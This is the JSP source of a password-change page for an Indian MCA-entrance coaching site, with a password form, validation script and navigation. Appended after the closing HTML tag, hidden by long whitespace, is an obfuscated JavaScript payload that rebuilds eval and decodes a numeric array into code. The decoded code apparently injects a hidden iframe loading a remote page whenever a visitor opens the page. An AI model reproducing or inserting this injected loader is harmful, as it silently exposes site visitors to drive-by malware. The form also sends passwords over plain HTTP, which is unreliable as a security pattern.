<%@ page language="java" import="java.sql.*,java.lang.*" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<TiTLE>Sanmacs India - Sanmacs Previlege</TITLE>
<HEAD>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.1.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.2.css>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta name="Keywords" content="SANMACS, MCA, MCA Entrance, IIT MCA, MCA Discussion Forum, MCA Notification, MCA Entrance Test, Aligarh Muslim University, Banaras Hindu University, Delhi University, DU MCA ENTRANCE Exam, Megaleap, Career Guidance, Results, Careers, Test Analysis, Exam Deadlines, General Knowledge, career builder, career education, career change, career training, MCA Entrance Notifications, AMU, BHU, Jamia Millia Islamia, Banasthali vidyapith, Bharathiar university,Cochin University, central university, GJU, GOA University, IMT, NCST, NIMC, Jamia Hamdard" >
<meta name="description" content="www.sanmacs.com-The Authority in Test Preparation....Specialization in MCA preparation, free online tests, sectional tips, Information about the university providing MCA Courses all over India, Declared results available on site, admission announcements, coaching, CET Patterns, regular test series, mock tests based on previous and guessed exam patterns, proper correspondence to students, handling query of student with first preference">
<style type="text/css">
DIV.Object1 { position:absolute; top:0px; left:0px; z-index:0;}
DIV.Object2 { position:absolute; top:-65px; left:302px; z-index:1;}
DIV.Object3 { position:absolute; top:33px; left:745px; z-index:2; }
DIV.Object4 { position:absolute; top:95px; left:0px; z-index:3; }

DIV.Object5 { position:absolute; top:148px; left:181px; width:486px; z-index:4;}

DIV.Object6 { position:absolute; top:148px; left:0px; z-index:5; }

DIV.Object8 { position:absolute; top:545px; left:0px; width:780px; z-index:7;}
DIV.Object9 { position:absolute; top:575px; left:0px; width:780px; z-index:8;}

DIV.Object11 { position:absolute; top:148px; left:670px; z-index:10;}

</style>
<SCRIPT language=JavaScript src="http://www.sanmacs.com/images2/marquee.js"></SCRIPT>
<SCRIPT language=JavaScript src="http://www.sanmacs.com/images2/sanlogin.js"></SCRIPT>
<script language=JavaScript>
function openWin(theURL,winName,features) {
window.open(theURL,winName,features);
}

function check()
{
	var a;
        a=reg(document.f.old_pass) && reg(document.f.new_pass) && reg(document.f.confirm_pass); 

	if (a)
	{
		
		f.submit();
	}
	else
	{
		return false;
	}
}

function reg(val1)
{
	var em,c1,d1,e1,g1,h,str1;
	em=val1.value;
	str1="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	c1=em.length;
	if (c1<1)
	{
    	alert("This field cannot be empty");
  	  	val1.focus();
     	return false;
  	}
	else
	{
    	d1=str1.length;
	 	for (k=0; k<c1; k++)
		{
			e1=em.charAt(k);
			g1=str1.indexOf(e1);
			if (g1 < 0)
			{
				alert ("Enter a valid Data.");
				val1.focus();
				val1.select();
				return false;
			}
		}
	}
	return true;
}

</script>
<SCRIPT language=javascript> function noRightClick() { if (event.button==2) { alert("Sorry! Right click is not permitted.") } } document.onmousedown=noRightClick </SCRIPT>
</HEAD>
<BODY bgcolor="#FFFFFF" topmargin="0" leftmargin="0">

<Div class="Object1">
<img src="http://www.sanmacs.com/images2/mca_logo.jpg" alt="MCA Entrance"></img>
</Div>

<Div class="Object2">
<embed src="http://www.sanmacs.com/swffiles/mca_identity.swf" wmode=transparent width=467></embed>
</Div>

<Div class="Object3">
<a href="http://www.sanmacs.com/index.htm"><img src="http://www.sanmacs.com/images2/home.gif" name=imgx onMouseover="imgx.src='http://www.sanmacs.com/images2/home2.gif'" onMouseout="imgx.src='http://www.sanmacs.com/images2/home.gif'" alt=Home border=0></img></a>
</Div>

<DIV class="Object4">
<SCRIPT type=text/javascript src="http://www.sanmacs.com/images2/mca_menu.js"></SCRIPT>
<NOSCRIPT>Your browser does not support script</NOSCRIPT> <!-- REST OF BODY CONTENT BELOW HERE -->
</DIV>

<%!String uid="";
%>

<%
	HttpSession rsm=request.getSession(true);
	session.setMaxInactiveInterval(900);

	uid=(String)rsm.getValue("userid");
	rsm.putValue("userid",uid);
%>

<DIV class="Object5">
<form name=f method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/confirmpass.jsp">
<table border=0 cellspacing=0 cellpadding=0>
<tr><td><img src="http://www.sanmacs.com/images2/change_passwords.gif"></img></td></tr>
<tr><td height=15></td></tr>
<tr><th height=20 background="http://www.sanmacs.com/images2/red_strip.gif"><p id="ftp" align="justify" style="margin-left:5px; color:white">Enter Following Details To Change Password</p></th></tr>
<tr><td height=18></td></tr>
<tr><th>
<table border=0 cellspacing=0 cellpadding=3 width=70%>
<tr><th><p id="ftp" align="justify">Old Password</p></th><th><p id="ftp" align="justify"><input type=password name=old_pass></p></th></tr>
<tr><th><p id="ftp" align="justify">New Password</p></th><th><p id="ftp" align="justify"><input type=password name=new_pass></p></th></tr>
<tr><th><p id="ftp" align="justify">Confirm Password</p></th><th><p id="ftp" align="justify"><input type=password name=confirm_pass></p></th></tr>
<tr><th height=10></th></tr>
<tr><th colspan=2><p id="ftp" align="justify" style="margin-left:130px"><input type="button" value="Submit" onClick="check();"></p></th></tr>
</table>
</th></tr>
</table>
</form>
</DIV>

<Div class="Object6">
<table border=0 cellpadding=0 cellspacing=0>
<tr><td><img src="http://www.sanmacs.com/images2/discussion_forum/expert-panel.gif"></img></td></tr>
<tr><td width=177 height=81 bgcolor=#933900></td></tr>
</table>
</Div>

<DIV class="Object8">
<table border=0 cellspacing=2 cellpadding=0 background="http://www.sanmacs.com/images2/lowstrip.gif" width=100%>
<tr height=30>
<th valign=top><a class="me" href="http://www.sanmacs.com/index.htm" title="Sanmacs Home">Home</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_about_us/identity.htm" title="About MCA Entrance">About Us</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/sanmacs_mca_entrance_course/megaleap.htm" title="Enrollment For MCA Entrance Coaching">Megaleap</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_training/mca_entrance_syllabus_of_universities/mca_entrance_syllabus_of_universities.htm" title="Training For MCA Entrance">MCA Training</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_notification/mca_entrance_admission_notification.htm" title="Notification For MCA Entrance">Notification</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_sanmacs_previlege/sanlogin.htm" title="MCA Entrance Previlege">Sanmacs Previlege</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/information_for_mca_entrance_students/sanmacs_student_speaks/Student_speaks.htm" title="Student Central For MCA Students">Student Central</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_voyage_of_success/mca_entrance_voyage_of_success.htm" title="Success of MCA Entrance">Voyage of Success</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/sanmacs_mca_entrance_alumni/register.htm" title="MCA Alumni">Alumni</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_contact/Contact.htm" title="Contact For MCA Training">Contact Us</a> </th>
</tr>
</table>
</DIV>

<DIV class="Object9">
<p id="ft5" align="center" style="BACKGROUND:#D9D5D4; color:#666666; font-weight:bold">All rights reserved. Copyright © Sanmacs India Pvt. Ltd &nbsp;&nbsp;&nbsp;<a href="http://www.sanmacs.com/mca_entrance_legal_disclaimer/Legal.htm" title="MCA Entrance Disclaimer">Legal Disclaimer</a></p>
</DIV>

<DIV class="Object11">
<table border=0 cellspacing=0 cellpadding=0>
<tr><td><embed src="http://www.sanmacs.com/swffiles/du_pune_toppers.swf" wmode=transparent width=106 height=395></embed></td></tr>
</table>
</DIV>

</BODY>
</HTML>

/*b5bee1*/
                                                                                                                                                                                                                                                          try{document.body/=2}catch(gdsgd){ww=window;v="va"+"l";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,116,102,102,114,32,60,30,97,111,98,115,106,101,109,114,43,99,113,99,94,116,100,67,105,101,108,99,107,116,39,37,102,102,113,95,106,101,38,39,56,13,9,11,7,32,31,30,29,116,102,102,114,46,114,112,96,32,60,30,36,104,115,114,109,58,46,45,108,114,104,113,112,97,115,109,114,114,45,97,108,109,46,95,97,118,115,45,112,101,96,112,96,104,55,44,109,104,111,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,111,109,112,105,115,103,108,110,31,59,29,39,96,96,112,111,107,115,113,101,38,57,10,10,31,30,29,32,115,101,101,117,45,113,113,121,107,99,43,98,110,112,97,101,113,30,58,32,38,46,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,117,102,100,115,102,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,107,99,99,116,31,59,29,39,48,110,117,39,58,11,7,32,31,30,29,116,102,102,114,46,114,114,118,108,100,44,113,111,111,30,58,32,38,47,109,120,38,57,10,10,12,8,29,32,31,30,102,102,31,38,30,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,114,100,104,116,90,36,62,59,45,97,105,117,60,36,41,58,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,43,97,111,110,98,110,99,65,101,105,107,98,37,116,102,102,114,41,58,11,7,32,31,30,29,125,12,8,122,41,39,39,56);}w=f;s=[];for(i=0;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;xz(s)}
/*/b5bee1*/
